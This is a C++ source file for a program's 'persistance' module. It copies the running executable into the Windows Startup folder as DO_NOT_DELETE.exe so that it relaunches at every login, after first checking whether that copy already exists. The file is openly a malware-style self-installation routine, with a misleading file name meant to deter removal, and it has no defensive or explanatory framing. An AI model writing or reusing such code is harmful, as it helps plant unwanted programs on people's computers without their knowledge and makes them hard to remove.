/**
 * @brief Checks if the program is persistent and if not installs itself to the system.
 * @file persistance.cpp
 * @author Sebastian Hasch
 * @date 27.11.2023
 */

#include <fstream>
#include <filesystem>
#include <stdexcept>


#include "../../include/persistance/persistance.hpp"
#include "../../include/util/util.hpp"
#include "../../include/errorMessages.hpp"

constexpr auto MAXLENGTH = 1024*1024*10;

persistance::persistance(char* argv) {
    wchar_t* localAppData = 0;
    SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &localAppData);
    std::wstring fullPath(localAppData);
    fullPath += std::wstring(L"\\Startup\\DO_NOT_DELETE.exe");
    this->fullPath = fullPath;
    CoTaskMemFree(static_cast<void*>(localAppData));
}

persistance::~persistance() {
    this->fullPath.clear();
}

 /**
  * @brief   Checks for persistance and if not, installs itself to the system.
  * @return  Boolean indicating persistance status.
  *          True - Persistance with autostart, False - No Persistance
  */
bool persistance::persist(char* argv) {
    if(checkPersist(argv) == false) 
        return makePersistent(argv);
    else
        return true;
}

bool persistance::checkPersist(char* argv) {
    util::File fileOnDisk = util::getFile(this->fullPath);
    util::File thisFile = util::getFile(argv);

    if (fileOnDisk.buffer == NULL || util::filecmp(fileOnDisk, thisFile))
        return false;

    return true;
}

bool persistance::makePersistent(char* argv) {
    std::ifstream src(argv, std::ios::binary);
    std::ofstream dst(this->fullPath, std::ios::binary);
    dst << src.rdbuf();
    dst.close();
    src.close();


    return true;
}